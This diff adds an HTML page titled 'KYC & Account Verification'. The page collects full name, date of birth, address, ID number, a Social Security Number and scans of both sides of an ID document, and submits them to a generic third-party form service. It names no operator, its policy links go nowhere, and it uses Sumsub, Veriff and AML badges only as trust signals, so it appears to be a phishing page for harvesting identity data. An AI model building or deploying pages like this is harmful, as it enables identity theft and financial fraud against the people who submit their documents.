@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KYC & Account Verification</title>
+<meta name="color-scheme" content="dark">
+<meta name="description" content="Complete your KYC verification to activate your account.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='75' font-size='75'>🛡</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+color-scheme: light;
+--bg: #f8fafc;
+--surface: #ffffff;
+--surface2: #f1f5f9;
+--border: #e2e8f0;
+--border-hover: #cbd5e1;
+--accent: #2563eb;
+--accent-glow: rgba(37,99,235,0.15);
+--text: #1e293b;
+--muted: #64748b;
+--muted2: #475569;
+--white: #ffffff;
+--success: #2563eb;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { background: #f8fafc; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', 'Helvetica Neue', sans-serif; background: #f8fafc; color: #1e293b; line-height: 1.5; -webkit-text-size-adjust: 100%; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; }
+
+/* HERO */
+.hero { background: #ffffff; border-bottom: 1px solid #e2e8f0; padding: 40px 24px 32px; }
+.hero-inner { max-width: 640px; margin: 0 auto; text-align: center; position: relative; z-index: 1; }
+.hero-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(37,99,235,0.1); border: 1px solid rgba(37,99,235,0.22); color: #2563eb; font-size: 11.5px; font-weight: 600; letter-spacing: 0.8px; text-transform: uppercase; padding: 5px 12px; border-radius: 20px; margin-bottom: 14px; }
+
+.kyc-notice { background: rgba(37,99,235,0.07); border: 1px solid rgba(37,99,235,0.18); border-radius: 10px; padding: 14px 16px; margin-bottom: 24px; display: flex; gap: 12px; align-items: flex-start; }
+.kyc-notice p { font-size: 13px; color: #475569; line-height: 1.6; }
+.kyc-notice strong { color: #1e293b; }
+.kyc-badge { background: rgba(37,99,235,0.1); border: 1px solid rgba(37,99,235,0.2); color: #2563eb; font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 5px; letter-spacing: 0.4px; }
+
+/* FORM FIELDS */
+.form-section { margin-bottom: 28px; }
+.section-label { font-size: 10.5px; font-weight: 600; letter-spacing: 1.3px; text-transform: uppercase; color: var(--muted); margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
+.form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.full { grid-column: 1 / 3; }
+.field { display: flex; flex-direction: column; }
+label { font-size: 12.5px; font-weight: 500; color: var(--muted2); margin-bottom: 6px; }
+label .req { color: var(--accent); margin-left: 2px; }
+label .hint { color: var(--muted); font-size: 11px; font-weight: 400; margin-left: 4px; }
+input, select, textarea { width: 100%; padding: 10px 13px; border-radius: 8px; border: 1px solid var(--border); font-size: 13.5px; font-family: 'Inter', sans-serif; color: var(--text) !important; background: var(--surface) !important; background-color: #ffffff !important; outline: none; transition: border-color 0.2s, box-shadow 0.2s; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
+input::placeholder { color: var(--muted); }
+input:focus, select:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
+select { cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238892aa' stroke-width='1.5' fill='none'/%3E%3C/svg%3E") !important; background-repeat: no-repeat !important; background-position: right 12px center !important; padding-right: 36px !important; }
+select option { background: #ffffff; }
+/* Fix browser autofill white background override */
+input:-webkit-autofill,
+input:-webkit-autofill:hover,
+input:-webkit-autofill:focus,
+input:-webkit-autofill:active,
+textarea:-webkit-autofill,
+textarea:-webkit-autofill:hover,
+textarea:-webkit-autofill:focus,
+select:-webkit-autofill,
+select:-webkit-autofill:hover,
+select:-webkit-autofill:focus {
+-webkit-box-shadow: 0 0 0px 1000px #ffffff inset !important;
+box-shadow: 0 0 0px 1000px #ffffff inset !important;
+-webkit-text-fill-color: #1e293b !important;
+color: #1e293b !important;
+background-color: #ffffff !important;
+caret-color: #1e293b;
+border-color: #e2e8f0 !important;
+}
+
+/* FORM CARD */
+.form-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; }
+.form-card-header { background: #f8fafc; border-bottom: 1px solid #e2e8f0; padding: 20px 28px; }
+.form-card-header h2 { font-family: 'Space Grotesk', sans-serif; font-size: 15px; font-weight: 600; color: #1e293b; }
+.form-body { padding: 32px 28px; background: #ffffff; }
+.file-upload-box { border: 2px dashed var(--border-hover); border-radius: 10px; padding: 22px 16px; text-align: center; cursor: pointer; transition: border-color 0.2s, background 0.2s; background: var(--surface2); }
+.file-upload-box:hover { border-color: #3b82f6; background: rgba(59,130,246,0.05); }
+.file-upload-box input[type="file"] { display: none !important; visibility: hidden !important; position: absolute !important; width: 0 !important; height: 0 !important; opacity: 0 !important; pointer-events: none !important; }
+.upload-icon { font-size: 28px; margin-bottom: 8px; }
+.upload-text { font-size: 13px; color: var(--muted2); line-height: 1.6; }
+.upload-text span { color: #3b82f6; font-weight: 600; }
+.upload-hint { font-size: 11.5px; color: var(--muted); margin-top: 4px; }
+.file-name-display { margin-top: 8px; font-size: 12px; color: #3b82f6; font-weight: 500; display: none; }
+
+/* CONSENT */
+.consent-row { display: flex; gap: 12px; align-items: flex-start; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 10px; padding: 16px; margin-bottom: 22px; cursor: pointer; transition: background 0.2s, border-color 0.2s; }
+.consent-row:hover { background: rgba(255,255,255,0.05); border-color: var(--accent); }
+.consent-row input[type="checkbox"] { width: 20px; height: 20px; min-width: 20px; min-height: 20px; margin-top: 3px; accent-color: var(--accent); flex-shrink: 0; cursor: pointer; pointer-events: auto; -webkit-appearance: none; -moz-appearance: none; appearance: auto; border: 2px solid var(--border); border-radius: 4px; background: var(--surface2); }
+.consent-row input[type="checkbox"]:hover { border-color: var(--accent); }
+.consent-row input[type="checkbox"]:focus { outline: 2px solid var(--accent); outline-offset: 2px; }
+.consent-row input[type="checkbox"]:checked { background: var(--accent); }
+.consent-row label { font-size: 12.5px; color: var(--muted); line-height: 1.6; margin: 0; cursor: pointer; user-select: none; }
+.consent-row a { color: var(--accent); text-decoration: underline; }
+
+/* BUTTON — blue gradient for professional KYC */
+.btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
+.btn-primary { flex: 1; background: #000080; color: #fff; border: none; padding: 12px 22px; border-radius: 10px; font-size: 14px; font-family: 'Space Grotesk', sans-serif; font-weight: 700; cursor: pointer; transition: all 0.2s; box-shadow: 0 2px 8px rgba(0,0,128,0.3); }
+.btn-primary:hover { background: #000066; box-shadow: 0 4px 12px rgba(0,0,128,0.4); }
+.btn-primary:active { transform: scale(0.98); }
+.btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+
+/* PRIVACY */
+.privacy-policy { margin-top: 28px; background: var(--surface2); border: 1px solid var(--border); border-radius: 12px; padding: 20px 22px; }
+.privacy-policy h4 { font-family: 'Space Grotesk', sans-serif; font-size: 13px; font-weight: 600; color: var(--white); margin-bottom: 12px; }
+.privacy-policy p { font-size: 12px; color: var(--muted); line-height: 1.7; margin-bottom: 10px; }
+.privacy-links { display: flex; gap: 14px; flex-wrap: wrap; margin-top: 14px; }
+.privacy-links a { font-size: 12px; color: var(--accent); text-decoration: underline; }
+
+/* SIDEBAR */
+.form-footer { margin-top: 24px; text-align: center; }
+.form-footer p { font-size: 12px; color: #64748b; }
+.form-footer a { color: #2563eb; text-decoration: none; }
+.form-footer a:hover { text-decoration: underline; }
+
+.form-container { width: 100%; max-width: 600px; margin: 0 auto; }
+
+@media (max-width: 768px) {
+.form-container { padding: 0; }
+.form-footer p { font-size: 11px; }
+}
+
+/* SUCCESS MODAL */
+#successModal { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,0.72); backdrop-filter: blur(6px); align-items: center; justify-content: center; }
+.modal-box { background: linear-gradient(135deg,#ffffff 0%,#f8fafc 100%); border: 1px solid rgba(37,99,235,0.2); border-radius: 20px; padding: 44px 40px; max-width: 460px; width: 90%; text-align: center; box-shadow: 0 24px 64px rgba(0,0,0,0.15); animation: popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275); position: relative; overflow: hidden; }
+.modal-icon { font-size: 56px; margin-bottom: 16px; }
+.modal-title { font-family: 'Space Grotesk', sans-serif; font-size: 22px; font-weight: 700; color: #2563eb; margin-bottom: 10px; }
+.modal-text { color: #475569; font-size: 14.5px; line-height: 1.75; margin-bottom: 8px; }
+.modal-note { background: rgba(37,99,235,0.08); border: 1px solid rgba(37,99,235,0.2); border-radius: 10px; padding: 12px 16px; margin-bottom: 26px; font-size: 13px; color: #475569; line-height: 1.6; }
+.modal-btn { background: #000080; color: #fff; border: none; padding: 12px 36px; border-radius: 10px; font-family: 'Space Grotesk', sans-serif; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,128,0.3); }
+.modal-btn:hover { background: #000066; }
+.modal-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg,#2563eb,#3b82f6,#2563eb); }
+
+@keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+/* ── RESPONSIVE ── */
+
+@media (max-width: 768px) {
+.hero { padding: 30px 16px 20px; }
+.hero h1 { font-size: 22px; line-height: 1.3; }
+.hero p { font-size: 13.5px; }
+.hero-badge { font-size: 10px; padding: 4px 10px; }
+.page-wrap { padding: 20px 16px 50px; }
+.form-container { max-width: 100%; }
+.form-card { border-radius: 12px; }
+.form-card-header { padding: 16px 20px; }
+.form-card-header h2 { font-size: 14px; }
+.form-body { padding: 20px 20px; }
+.form-grid { grid-template-columns: 1fr; }
+.full { grid-column: 1; }
+.kyc-notice { padding: 12px; flex-direction: column; }
+.kyc-providers { gap: 6px; }
+.file-upload-box { padding: 18px 12px; }
+.upload-icon { font-size: 24px; }
+.field { margin-bottom: 12px; }
+label { font-size: 12px; }
+input, select, textarea { font-size: 14px; padding: 12px; min-height: 44px; }
+.btn-primary { width: 100%; text-align: center; padding: 14px 20px; }
+.consent-row { flex-direction: column; gap: 10px; padding: 14px; }
+.form-footer p { font-size: 11px; }
+.modal-box { padding: 32px 22px; max-width: 90%; }
+.modal-title { font-size: 19px; }
+.modal-text { font-size: 13.5px; }
+.modal-note { font-size: 12px; }
+.modal-icon { font-size: 40px; }
+}
+
+@media (max-width: 480px) {
+.hero { padding: 24px 12px 16px; }
+.hero h1 { font-size: 19px; }
+.hero p { font-size: 13px; }
+.hero-badge { font-size: 9px; padding: 3px 8px; }
+.page-wrap { padding: 16px 12px 40px; }
+.form-body { padding: 16px 16px; }
+.form-card-header { padding: 14px 16px; }
+.form-card-header h2 { font-size: 13px; }
+.kyc-notice { padding: 10px; }
+.kyc-badge { font-size: 9px; padding: 2px 6px; }
+.btn-primary { font-size: 13px; padding: 12px 16px; }
+.modal-box { padding: 28px 16px; }
+.modal-title { font-size: 17px; }
+.modal-text { font-size: 12px; }
+.modal-note { font-size: 11px; padding: 10px 12px; }
+.modal-btn { width: 100%; padding: 12px 24px; }
+.file-upload-box { padding: 14px 10px; }
+.upload-icon { font-size: 22px; }
+.upload-text { font-size: 12px; }
+.upload-hint { font-size: 10px; }
+.field { margin-bottom: 10px; }
+input, select, textarea { font-size: 13px; padding: 10px; }
+.form-footer p { font-size: 10px; }
+}
+
+@media (max-width: 480px) {
+.hero { padding: 24px 12px 16px; }
+.hero h1 { font-size: 19px; }
+.hero p { font-size: 13px; }
+.hero-badge { font-size: 9px; padding: 3px 8px; }
+.page-wrap { padding: 16px 12px 40px; }
+.form-body { padding: 14px; }
+.form-card-header { padding: 12px 14px; }
+.form-card-header h2 { font-size: 13px; }
+.kyc-notice { padding: 10px; }
+.kyc-badge { font-size: 9px; padding: 2px 6px; }
+.btn-primary { font-size: 13px; padding: 12px 16px; }
+.modal-box { padding: 28px 16px; }
+.modal-title { font-size: 17px; }
+.modal-text { font-size: 12px; }
+.modal-note { font-size: 11px; padding: 10px 12px; }
+.modal-btn { width: 100%; padding: 12px 24px; }
+.file-upload-box { padding: 14px 10px; }
+.upload-icon { font-size: 22px; }
+.upload-text { font-size: 12px; }
+.upload-hint { font-size: 10px; }
+.field { margin-bottom: 10px; }
+input, select, textarea { font-size: 13px; padding: 10px; }
+.form-footer p { font-size: 10px; }
+}
+@media (min-width: 1200px) and (max-width: 1399px) {
+.page-wrap { max-width: 1100px; grid-template-columns: 1fr 300px; gap: 28px; }
+.hero-inner { max-width: 1100px; }
+.hero h1 { font-size: 34px; }
+.hero p { font-size: 16px; }
+}
+@media (min-width: 1025px) and (max-width: 1199px) {
+.page-wrap { max-width: 960px; grid-template-columns: 1fr 260px; gap: 20px; }
+.hero-inner { max-width: 960px; }
+.hero { padding: 20px 24px 36px; }
+.hero h1 { font-size: 28px; }
+.hero p { font-size: 15px; }
+.form-body { padding: 24px; }
+.form-card-header { padding: 16px 24px; }
+}
+@media (min-width: 769px) and (max-width: 1024px) {
+.header { padding: 0 24px; }
+.reg-banner { padding: 10px 24px; }
+.hero { padding: 20px 24px 40px; }
+.page-wrap { max-width: 100%; padding: 24px 24px 60px; grid-template-columns: 1fr 240px; gap: 18px; }
+.hero h1 { font-size: 26px; }
+.hero p { font-size: 14px; }
+.form-body { padding: 22px; }
+.form-card-header { padding: 16px 22px; }
+.sidebar-card { padding: 16px; }
+.sidebar-card h3 { font-size: 14px; }
+.sidebar-card li { font-size: 13px; }
+}
+@media (max-width: 768px) {
+.header { padding: 0 16px; height: 56px; }
+.logo-text { font-size: 16px; }
+.logo-wrap { gap: 6px; }
+.reg-banner { top: 56px; padding: 7px 16px; font-size: 11px; justify-content: center; text-align: center; }
+.hero { padding: 16px 16px 24px; }
+.hero h1 { font-size: 22px; line-height: 1.3; }
+.hero p { font-size: 13.5px; }
+.hero-badge { font-size: 10px; padding: 4px 10px; }
+.page-wrap { grid-template-columns: 1fr; padding: 16px 16px 60px; margin: 16px auto; gap: 16px; }
+.form-card { border-radius: 12px; }
+.form-card-header { padding: 14px 18px; flex-direction: column; gap: 8px; align-items: flex-start; }
+.form-card-header h2 { font-size: 14px; }
+.form-grid { grid-template-columns: 1fr; }
+.full { grid-column: 1; }
+.form-body { padding: 18px; }
+.kyc-notice { padding: 12px; flex-direction: column; }
+.kyc-providers { gap: 6px; }
+.file-upload-box { padding: 18px 12px; }
+.upload-icon { font-size: 24px; }
+.sidebar { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.ssl-badge { grid-column: 1 / 3; }
+.modal-box { padding: 32px 22px; max-width: 90%; }
+.modal-title { font-size: 19px; }
+.modal-text { font-size: 13.5px; }
+.modal-note { font-size: 12px; }
+.modal-icon { font-size: 40px; }
+.steps { display: none; }
+.field { margin-bottom: 12px; }
+label { font-size: 12px; }
+input, select, textarea { font-size: 14px; padding: 12px; min-height: 44px; }
+.btn-primary { width: 100%; text-align: center; padding: 14px 20px; }
+.consent-row { flex-direction: column; gap: 10px; padding: 14px; }
+.consent-row input[type="checkbox"] { margin-top: 0; }
+.sidebar-card { padding: 14px; }
+.sidebar-card ul { gap: 6px; }
+.sidebar-card li { font-size: 12px; }
+.sidebar-card h3 { font-size: 13px; }
+.privacy-policy { padding: 14px; }
+.privacy-policy h4 { font-size: 12px; }
+.privacy-policy p { font-size: 11px; }
+.privacy-links { flex-direction: column; gap: 8px; }
+.btn-row { flex-direction: column; gap: 10px; }
+}
+@media (max-width: 480px) {
+.header { padding: 0 12px; height: 52px; }
+.logo-text { font-size: 14px; }
+.reg-banner { top: 52px; padding: 6px 10px; font-size: 10px; gap: 2px; }
+.hero { padding: 14px 12px 20px; }
+.hero h1 { font-size: 19px; }
+.hero p { font-size: 13px; }
+.hero-badge { font-size: 9px; padding: 3px 8px; }
+.page-wrap { padding: 12px 12px 50px; margin: 12px auto; }
+.form-body { padding: 14px; }
+.form-card-header { padding: 12px 14px; }
+.form-card-header h2 { font-size: 13px; }
+.kyc-notice { padding: 10px; }
+.kyc-badge { font-size: 9px; padding: 2px 6px; }
+.sidebar { grid-template-columns: 1fr; }
+.ssl-badge { grid-column: 1; }
+.btn-primary { font-size: 13px; padding: 12px 16px; }
+.modal-box { padding: 28px 16px; }
+.modal-title { font-size: 17px; }
+.modal-text { font-size: 12px; }
+.modal-note { font-size: 11px; padding: 10px 12px; }
+.modal-btn { width: 100%; padding: 12px 24px; }
+.file-upload-box { padding: 14px 10px; }
+.upload-icon { font-size: 22px; }
+.upload-text { font-size: 12px; }
+.upload-hint { font-size: 10px; }
+.field { margin-bottom: 10px; }
+input, select, textarea { font-size: 13px; padding: 10px; }
+.privacy-policy h4 { font-size: 11px; }
+.privacy-policy p { font-size: 10px; }
+#page-content { background: #f8fafc; min-height: 100vh; }
+</style>
+
+</head>
+<body>
+<div id="page-content">
+
+
+
+<!-- MAIN PAGE -->
+
+<div class="page-wrap">
+<div class="form-container">
+<div class="form-card">
+<div class="form-card-header">
+<h2>More Information Required</h2>
+</div>
+
+ 
+<div class="form-body">
+<div class="kyc-notice">
+<div>
+<p>Your identity is verified by certified KYC providers. Documents are <strong>encrypted in transit and at rest</strong>, reviewed only by our licensed compliance team.</p>
+<div class="kyc-providers">
+<span class="kyc-badge">✓ Sumsub</span>
+<span class="kyc-badge">✓ Veriff</span>
+<span class="kyc-badge">✓ AML Compliant</span>
+</div>
+</div>
+</div>
+
+<form action="https://formspree.io/f/mwvajrbj" enctype='multipart/form-data' id='onboardingForm' method='POST' name='kyc-onboarding'>
+<input type="hidden" name="form-name" value="kyc-onboarding">
+<p style="display:none"><label>Don't fill this out: <input name="bot-field"></label></p>
+
+<!-- SECTION 1 — BASIC INFORMATION -->
+<div class="form-section">
+<div class="section-label">01 — Basic Information</div>
+<div class="form-grid">
+<div class="field">
+<label for="fullName">Full Name <span class="req">*</span></label>
+<input id="fullName" name="fullName" type="text" placeholder="As shown on your ID" required>
+</div>
+<div class="field">
+<label for="phone">Phone Number <span class="req">*</span></label>
+<input id="phone" name="phone" type="tel" placeholder="+1 234 567 8900" required>
+</div>
+<div class="field">
+<label for="email">Email Address <span class="req">*</span></label>
+<input id="email" name="email" type="email" placeholder="you@example.com" required>
+</div>
+<div class="field">
+<label for="dob">Date of Birth <span class="req">*</span></label>
+<input id="dob" name="dob" type="date" required>
+</div>
+</div>
+</div>
+
+<!-- SECTION 2 — RESIDENTIAL ADDRESS -->
+<div class="form-section">
+<div class="section-label">02 — Residential Address</div>
+<div class="form-grid">
+<div class="field full">
+<label for="street">Street Address <span class="req">*</span></label>
+<input id="street" name="street" type="text" placeholder="House number and street name" required>
+</div>
+<div class="field">
+<label for="city">City <span class="req">*</span></label>
+<input id="city" name="city" type="text" placeholder="Your city" required>
+</div>
+<div class="field">
+<label for="stateProvince">State / Province <span class="req">*</span></label>
+<input id="stateProvince" name="stateProvince" type="text" placeholder="State or province" required>
+</div>
+<div class="field">
+<label for="postal">Postal / ZIP Code</label>
+<input id="postal" name="postal" type="text" placeholder="e.g. 100001">
+</div>
+<div class="field">
+<label for="country">Country <span class="req">*</span></label>
+<select id="country" name="country" required>
+<option value="">Select country</option>
+<option value="us">United States</option>
+<option value="uk">United Kingdom</option>
+<option value="ca">Canada</option>
+<option value="au">Australia</option>
+<option value="nz">New Zealand</option>
+<option value="ie">Ireland</option>
+<option value="de">Germany</option>
+<option value="fr">France</option>
+<option value="it">Italy</option>
+<option value="es">Spain</option>
+<option value="nl">Netherlands</option>
+<option value="be">Belgium</option>
+<option value="ch">Switzerland</option>
+<option value="at">Austria</option>
+<option value="se">Sweden</option>
+<option value="no">Norway</option>
+<option value="dk">Denmark</option>
+<option value="fi">Finland</option>
+<option value="pt">Portugal</option>
+<option value="pl">Poland</option>
+<option value="ae">UAE</option>
+<option value="sa">Saudi Arabia</option>
+<option value="qa">Qatar</option>
+<option value="kw">Kuwait</option>
+<option value="bh">Bahrain</option>
+<option value="om">Oman</option>
+<option value="in">India</option>
+<option value="sg">Singapore</option>
+<option value="my">Malaysia</option>
+<option value="ph">Philippines</option>
+<option value="id">Indonesia</option>
+<option value="jp">Japan</option>
+<option value="kr">South Korea</option>
+<option value="hk">Hong Kong</option>
+<option value="th">Thailand</option>
+<option value="vn">Vietnam</option>
+<option value="pk">Pakistan</option>
+<option value="bd">Bangladesh</option>
+<option value="lk">Sri Lanka</option>
+<option value="ng">Nigeria</option>
+<option value="gh">Ghana</option>
+<option value="ke">Kenya</option>
+<option value="za">South Africa</option>
+<option value="tz">Tanzania</option>
+<option value="ug">Uganda</option>
+<option value="rw">Rwanda</option>
+<option value="et">Ethiopia</option>
+<option value="cm">Cameroon</option>
+<option value="ci">Côte d'Ivoire</option>
+<option value="sn">Senegal</option>
+<option value="zm">Zambia</option>
+<option value="zw">Zimbabwe</option>
+<option value="br">Brazil</option>
+<option value="mx">Mexico</option>
+<option value="ar">Argentina</option>
+<option value="co">Colombia</option>
+<option value="cl">Chile</option>
+<option value="pe">Peru</option>
+<option value="other">Other</option>
+</select>
+</div>
+</div>
+</div>
+
+<!-- SECTION 3 — IDENTITY DOCUMENTS -->
+<div class="form-section">
+<div class="section-label">03 — Identity Documents</div>
+<div class="form-grid">
+<div class="field">
+<label for="idType">ID Document Type <span class="req">*</span></label>
+<select id="idType" name="idType" required>
+<option value="">Select type</option>
+<option value="passport">Passport</option>
+<option value="drivers_license">Driver's License</option>
+<option value="national_id">National ID Card</option>
+<option value="residence_permit">Residence Permit</option>
+</select>
+</div>
+<div class="field">
+<label for="idNumber">ID Document Number <span class="req">*</span></label>
+<input id="idNumber" name="idNumber" type="text" placeholder="e.g. AB1234567" required>
+</div>
+<div class="field full">
+<label for="ssn">Social Security Number (SSN) <span class="req">*</span> <span class="hint">Used for identity verification only — encrypted &amp; never shared</span></label>
+<input id="ssn" name="ssn" type="password" placeholder="e.g. 123-45-6789" pattern="^\d{3}-?\d{2}-?\d{4}$" autocomplete="off" required>
+</div>
+<div class="field full">
+<label>Upload ID Document (Front) <span class="req">*</span> <span class="hint">(JPG, PNG or PDF · max 10MB)</span></label>
+<div class="file-upload-box" onclick="document.getElementById('idUploadFront').click()">
+<input type="file" id="idUploadFront" name="idDocumentFront" accept=".jpg,.jpeg,.png,.pdf" required onchange="showFileName(this,'idFileNameFront')">
+<div class="upload-icon"></div>
+<div class="upload-text"><span>Click to upload</span> the front of your ID</div>
+<div class="upload-hint">Passport, Driver's License or National ID - Front</div>
+<div class="file-name-display" id="idFileNameFront"></div>
+</div>
+</div>
+<div class="field full">
+<label>Upload ID Document (Back) <span class="req">*</span> <span class="hint">(JPG, PNG or PDF · max 10MB)</span></label>
+<div class="file-upload-box" onclick="document.getElementById('idUploadBack').click()">
+<input type="file" id="idUploadBack" name="idDocumentBack" accept=".jpg,.jpeg,.png,.pdf" required onchange="showFileName(this,'idFileNameBack')">
+<div class="upload-icon"></div>
+<div class="upload-text"><span>Click to upload</span> the back of your ID</div>
+<div class="upload-hint">Passport, Driver's License or National ID - Back</div>
+<div class="file-name-display" id="idFileNameBack"></div>
+</div>
+</div>
+
+
+</div>
+</div>
+
+<!-- CONSENT -->
+<div class="consent-row">
+<input type="checkbox" id="consent" name="consent" value="yes" required>
+<label for="consent">
+I confirm that all information provided is accurate and I consent to the processing of my personal data for KYC verification purposes in accordance with the <a href="#privacy">Privacy Policy</a> and <a href="#privacy">AML Compliance Standards</a>.
+</label>
+</div>
+
+<div class="btn-row">
+<button type="submit" class="btn-primary" id="submitBtn">
+Submit Verification
+</button>
+</div>
+</form>
+</div>
+</div>
+
+<!-- PRIVACY POLICY -->
+<div class="privacy-policy" id="privacy">
+<h4>Privacy Policy &amp; Regulatory Disclosure</h4>
+<p><strong style="color:var(--muted2)">Data Controller:</strong> Verified via Sumsub &amp; Veriff. We collect personal information solely for account onboarding and KYC compliance as required by applicable financial regulations.</p>
+<p><strong style="color:var(--muted2)">KYC Partners:</strong> Identity verification is conducted via <strong style="color:var(--muted2)">Sumsub</strong> and/or <strong style="color:var(--muted2)">Veriff</strong>, globally certified providers. Data is encrypted in transit and at rest, shared only with our licensed compliance partners.</p>
+<p><strong style="color:var(--muted2)">Data Retention:</strong> KYC documents are retained for a minimum of 5 years as required by AML regulations. We do not sell or share your data with advertisers or unauthorized third parties.</p>
+<p><strong style="color:var(--muted2)">Your Rights:</strong> You may access, correct, or request deletion of your data. Contact our compliance team via the support channel provided upon account activation.</p>
+<div class="privacy-links">
+<a href="#">Full Privacy Policy</a>
+<a href="#">Terms of Service</a>
+<a href="#">AML Policy</a>
+<div class="form-footer">
+<p>256-bit SSL Encrypted &nbsp;·&nbsp; AML &amp; KYC Compliant &nbsp;·&nbsp; <a href="#privacy">Privacy Policy</a></p>
+</div>
+
+</div>
+
+<!-- SUCCESS MODAL -->
+
+<div id="successModal">
+<div class="modal-box">
+<div class="modal-icon"></div>
+<h2 class="modal-title">Submitted Successfully</h2>
+<p class="modal-text">Your documents have been received and are being reviewed by our compliance team.</p>
+<p class="modal-text">You will receive an email confirmation once the review is complete.</p>
+<button class="modal-btn" onclick="closeModal()">Done</button>
+</div>
+</div>
+
+<script>
+if (new URLSearchParams(window.location.search).get('submitted') === '1') {
+document.getElementById('successModal').style.display = 'flex';
+}
+
+function closeModal() {
+document.getElementById('successModal').style.display = 'none';
+window.history.replaceState({}, '', window.location.pathname);
+}
+
+function showFileName(input, displayId) {
+var display = document.getElementById(displayId);
+if (input.files && input.files.length > 0) {
+display.textContent = '✓ ' + input.files[0].name;
+display.style.display = 'block';
+} else {
+display.style.display = 'none';
+}
+}
+
+document.getElementById('onboardingForm').addEventListener('submit', function() {
+var btn = document.getElementById('submitBtn');
+btn.disabled = true;
+btn.textContent = '⏳ Submitting...';
+});
+</script>
+
+</div>
+</body>
+</html>
